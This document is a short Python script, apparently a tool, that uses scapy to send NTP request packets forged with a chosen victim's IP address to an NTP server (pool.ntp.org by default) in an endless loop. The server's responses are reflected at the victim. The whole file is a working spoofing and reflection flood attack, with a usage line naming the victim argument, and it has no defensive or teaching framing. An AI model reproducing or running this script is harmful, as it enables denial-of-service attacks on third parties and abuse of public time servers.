import socket
import struct
import datetime
from scapy.all import *
import threading
import os
import sys
import socket


if len(sys.argv) > 3 or len(sys.argv) < 2:
    print("Usage python3 ntpclient.py 'IP_VICTIM' 'NTP_SERVER'")
    exit()

# IP SPOOFER

A = sys.argv[1] # spoofed source IP address

#A = "127.0.0.1" # spoofed source IP address

B = "pool.ntp.org"
if (len(sys.argv) == 3):
    B = sys.argv[2] # "pool.ntp.org" # destination IP address

C = RandShort() # source port
D = 80 # destination port
payload = ("\x1b\x00\x00\x00"+"\x00"*11*4) # packet NTP payload 

i = 1
while True:
    spoofed_packet = IP(src=A, dst=B) / UDP(dport=123,sport=50000) / payload
    #sniff(prn=lambda x:x.summary(), count=5)
    print(str(i) + "->")
    i = i+1
    send(spoofed_packet)
    
# rep,non_rep = sr(spoofed_packet)



